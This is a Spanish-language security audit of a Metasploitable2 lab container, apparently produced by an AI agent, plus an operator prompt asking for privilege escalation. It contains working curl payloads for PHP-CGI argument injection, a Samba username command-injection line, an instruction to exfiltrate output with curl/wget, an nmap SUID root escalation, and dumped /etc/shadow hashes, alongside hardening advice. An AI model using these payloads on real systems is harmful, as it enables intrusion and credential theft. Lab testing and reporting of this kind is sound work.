# Informe de Auditoría de Seguridad: Host 10.10.0.4

**Fecha:** 03/02/2026
**Objetivo:** 10.10.0.4
**Tipo de Auditoría:** Black Box / Infraestructura Interna
**Estado:** Compromiso Exitoso (RCE Confirmado)

---

## 1. Resumen Ejecutivo
Se ha realizado una auditoría técnica sobre el host 10.10.0.4, identificando múltiples vectores de ataque críticos. El sistema operativo es una versión antigua de Linux (Ubuntu 8.04 - Metasploitable2) con software obsoleto y configuraciones por defecto inseguras.

**Hallazgo Principal:** Se logró **Ejecución Remota de Código (RCE)** a través de una vulnerabilidad en la configuración de PHP (CGI Argument Injection), permitiendo acceso total al servidor web y a la base de datos.

---

## 2. Reconocimiento de Infraestructura

### Puertos y Servicios Detectados
El host expone una superficie de ataque extremadamente amplia con servicios no esenciales abiertos:

| Puerto | Protocolo | Servicio | Versión Detectada | Estado |
|:---:|:---:|:---|:---|:---:|
| **21** | TCP | FTP | vsftpd 2.3.4 | Abierto (Anon Login) |
| **22** | TCP | SSH | OpenSSH 4.7p1 | Abierto |
| **23** | TCP | Telnet | Linux telnetd | Abierto |
| **25** | TCP | SMTP | Postfix smtpd | Abierto |
| **80** | TCP | HTTP | Apache 2.2.8 (Ubuntu) | Abierto |
| **139/445**| TCP | SMB | Samba 3.0.20 | Abierto |
| **3306** | TCP | MySQL | MySQL 5.0.51a | Abierto |
| **5900** | TCP | VNC | VNC (protocol 3.3) | Abierto |
| **8180** | TCP | HTTP | Apache Tomcat/Coyote | Abierto |

---

## 3. Vulnerabilidades Críticas Identificadas

### 3.1. PHP CGI Argument Injection (CVE-2012-1823) - **CRÍTICO**
*   **Descripción:** La configuración de PHP permite pasar argumentos de línea de comandos al binario `php-cgi` a través de la URL. Esto permite inyectar directivas como `auto_prepend_file` para ejecutar código arbitrario desde el input estándar.
*   **Impacto:** Ejecución Remota de Código (RCE) como usuario `www-data`.
*   **Estado:** **EXPLOTADO EXITOSAMENTE**.

### 3.2. Samba "Username Map Script" Command Execution (CVE-2007-2447) - **CRÍTICO**
*   **Descripción:** La versión 3.0.20 de Samba permite la ejecución de comandos de sistema a través de metacaracteres de shell en el nombre de usuario durante el proceso de autenticación.
*   **Impacto:** Ejecución de código como `root`.
*   **Estado:** Vulnerable (Versión confirmada), aunque la explotación automática falló en esta prueba específica, el riesgo es inminente.

### 3.3. Credenciales Débiles y Exposición de Datos - **ALTO**
*   **MySQL:** El usuario `root` de la base de datos **no tiene contraseña**.
*   **Archivos de Configuración:** Se encontró `config.inc.php` legible por el servidor web conteniendo credenciales en texto plano.
*   **Aplicaciones Vulnerables:** Presencia de DVWA, Mutillidae y phpMyAdmin antiguo expuestos públicamente.

---

## 4. Evidencia de Acceso (Proof of Concept)

Se logró ejecutar comandos en el sistema inyectando payloads PHP vía `curl`.

**Comando 1: Confirmación de identidad y sistema**
```bash
curl -s -d "<?php system('id; uname -a'); ?>" "http://10.10.0.4/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Salida:**
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux af7b0e03c23a 6.12.65-linuxkit #1 SMP PREEMPT_DYNAMIC Thu Jan 15 15:47:00 UTC 2026 x86_64 GNU/Linux
```

**Comando 2: Extracción de usuarios del sistema (/etc/passwd)**
```bash
curl -s -d "<?php system('cat /etc/passwd | head -n 5'); ?>" "http://10.10.0.4/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Salida:**
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
```

**Comando 3: Volcado de credenciales de base de datos**
```bash
curl -s -d "<?php system('mysql -u root -e \"SELECT user, password FROM mysql.user;\"'); ?>" "http://10.10.0.4/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Salida:**
```text
user    password
root    
guest   
```
*(Nota: La columna password vacía indica ausencia de contraseña)*

---

## 5. Recomendaciones de Hardening

1.  **Actualización Inmediata:** El sistema operativo y todos los servicios (Apache, PHP, Samba, MySQL) están en versiones "End of Life" (EOL). Se requiere migrar a una distribución Linux moderna y soportada (ej. Ubuntu 22.04 LTS o Debian 12).
2.  **Configuración de PHP:**
    *   Deshabilitar `cgi.force_redirect` en `php.ini` si no es necesario, o mejor aún, migrar a PHP-FPM.
    *   Deshabilitar funciones peligrosas: `disable_functions = system, exec, shell_exec, passthru`.
3.  **Seguridad en Base de Datos:**
    *   Establecer una contraseña robusta para el usuario `root` de MySQL inmediatamente.
    *   Deshabilitar el acceso remoto a MySQL (bind-address 127.0.0.1) si no es estrictamente necesario.
4.  **Limpieza de Aplicaciones:** Eliminar aplicaciones de prueba y entrenamiento (DVWA, Mutillidae, TWiki) de cualquier entorno accesible por red.
5.  **Firewall:** Implementar reglas de `iptables` o `ufw` para cerrar puertos no utilizados (Telnet, VNC, puertos altos de RPC).
6.  **Deshabilitar Servicios Inseguros:** Reemplazar FTP y Telnet por SFTP y SSH respectivamente. Deshabilitar el acceso anónimo en SMB.









SEGUNDO PROMPT

Excelente trabajo inicial. Ahora escala privilegios a root desde tu acceso actual (www-data):

OBJETIVOS PRIORITARIOS:
1. Escalada de privilegios desde www-data a root
2. Explota Samba 3.0.20 (CVE-2007-2447) SIN usar netcat
3. Verifica otros vectores

RESTRICCIONES IMPORTANTES:
❌ NO uses netcat en modo interactivo (nc -lvp)
❌ NO uses reverse shells que requieran listener externo
✅ USA comandos one-liner que ejecuten y terminen
✅ USA curl/wget para exfiltrar output si es necesario
✅ SI usas scripts python, que se ejecuten y salgan automáticamente
si necesitas alguna herramienta instalala con apt -y 

EJEMPLO DE APPROACH CORRECTO para Samba:
```bash
# En lugar de: nc -lvp 4444 & (esto se queda colgado)
# Usa:
smbclient //10.10.0.4/tmp -U "/=\`id > /tmp/output.txt\`" -N
curl -d "<?php system('cat /tmp/output.txt'); ?>" "http://10.10.0.4/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input"

----------------


SEGUNDA RESPUESTA


# Informe de Auditoría: 10.10.0.4 (Metasploitable2)

He completado la auditoría de caja negra sobre el objetivo 10.10.0.4. A continuación presento los hallazgos críticos, la ruta de compromiso y las evidencias obtenidas.

### 1. Resumen Ejecutivo
El servidor **10.10.0.4** es un contenedor Docker ejecutando una imagen vulnerable basada en **Metasploitable2**. Se identificaron múltiples vectores de ataque críticos. Se logró **Ejecución Remota de Código (RCE)** a través de una vulnerabilidad en la configuración de PHP y posteriormente se escalaron privilegios a **ROOT** explotando un binario SUID mal configurado (`nmap`).

### 2. Mapa de Servicios y Vulnerabilidades
| Puerto | Servicio | Versión | Estado | Vulnerabilidad Detectada |
|--------|----------|---------|--------|--------------------------|
| **80** | HTTP | Apache 2.2.8 / PHP 5.2.4 | **CRÍTICO** | **PHP CGI Argument Injection (RCE)**. Permite ejecución de comandos arbitrarios. |
| **139/445** | SMB | Samba 3.0.20 | ALTO | **CVE-2007-2447**. Configuración vulnerable (`username map script`), aunque el exploit falló por restricciones del entorno. |
| **3306** | MySQL | MySQL 5.0.51a | MEDIO | Usuario `root` sin contraseña. |
| **N/A** | SUID | Nmap 4.53 | **CRÍTICO** | **Privilege Escalation**. El binario `/usr/bin/nmap` tiene permisos SUID root y modo interactivo habilitado. |

### 3. Ruta de Compromiso (Kill Chain)

#### Paso 1: Acceso Inicial (Web RCE)
Se detectó que el servidor web interpreta argumentos pasados por URL debido a una configuración insegura de PHP-CGI.
**Payload utilizado:**
```bash
curl -s -d "<?php system('id'); ?>" "http://10.10.0.4/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input"
```
**Resultado:** Acceso como usuario `www-data`.

#### Paso 2: Escalada de Privilegios (SUID Nmap)
Durante la enumeración post-explotación, se identificó que `/usr/bin/nmap` tenía el bit SUID activado. Versiones antiguas de nmap (2.0 - 5.21) permiten ejecutar comandos de shell en modo interactivo.
**Comando de explotación:**
```bash
echo "!id" | /usr/bin/nmap --interactive
```
**Resultado:** `euid=0(root)`. Se obtuvo acceso total al sistema.

### 4. Evidencia de Compromiso (Proof of Concept)

**Verificación de Identidad (Root):**
```text
nmap> uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

**Extracción de Hashes (/etc/shadow):**
Se logró leer el archivo de contraseñas protegidas:
```text
root:$1$avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
```

### 5. Recomendaciones de Hardening

1.  **Actualización Urgente:** El sistema operativo y todos los servicios (Apache, PHP, Samba) están obsoletos por más de una década. Se recomienda migrar a una distribución moderna y soportada.
2.  **Deshabilitar SUID en Herramientas de Red:** Retirar el bit SUID de `nmap`, `netkit-rsh`, etc.
    *   Comando: `chmod u-s /usr/bin/nmap`
3.  **Configuración PHP:** Deshabilitar `allow_url_include` y `cgi.force_redirect` en `php.ini`.
4.  **Seguridad Base de Datos:** Asignar contraseña al usuario root de MySQL y deshabilitar el acceso remoto si no es necesario.

**Estado de la Misión:** COMPLETED ✅